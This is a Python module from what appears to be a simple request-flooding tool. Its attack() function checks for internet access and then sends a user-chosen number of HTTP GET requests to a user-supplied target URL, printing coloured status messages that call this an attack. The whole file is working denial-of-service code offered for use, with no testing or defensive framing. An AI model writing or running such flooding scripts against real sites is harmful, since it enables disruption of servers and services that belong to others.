import requests
import socket
from colorama import Fore
from modules import user_input

def check_internet_connection():
    try:
        host = socket.gethostbyname("www.google.com")
        s = socket.create_connection((host, 80), 2)
        return True
    except:
        pass
    return False

def attack():
    if check_internet_connection():
        print()
        print(Fore.LIGHTBLUE_EX + "Starting attack to " + Fore.GREEN + user_input.target_url + Fore.LIGHTBLUE_EX + " with " + Fore.GREEN + str(user_input.requests_count) + Fore.LIGHTBLUE_EX + " requests :"+Fore.RESET)

        for i in range(1, user_input.requests_count+1):

            try:
                req = requests.get(user_input.target_url, timeout=10)
                if req.status_code == 200:
                    print(Fore.GREEN + "[*] Request " + Fore.BLUE + str(i) + Fore.GREEN + " successfully sent to the target" + Fore.RESET)
                elif req.status_code == 404:
                    print(Fore.LIGHTRED_EX + "[*] Request " + Fore.BLUE + str(i) + Fore.LIGHTRED_EX + " sent to the target, but got a 404 Not Found error, maybe the URL is wrong or deleted or moved to another one" + Fore.RESET)
                elif str(req.status_code).startswith("3"):
                    print(Fore.YELLOW + "[*] Request " + Fore.BLUE + str(i) + Fore.YELLOW + " sent to the target, but got a 3xx code, maybe there was a redirection" + Fore.RESET)
                else:
                    print(Fore.RED + "[*] The request couldn't be sent, there was a problem with your network or maybe the problem was from the server, if it repeated check everything then try again" + Fore.RESET)



            except:
                print(Fore.RED + "[*] The request couldn't be sent, there was a problem with your network or maybe the problem was from the server, if it repeated check everything then try again" + Fore.RESET)

    else:
        print((Fore.RED + "[*] Please check your internet connection, It seems you don't have access to internet"))
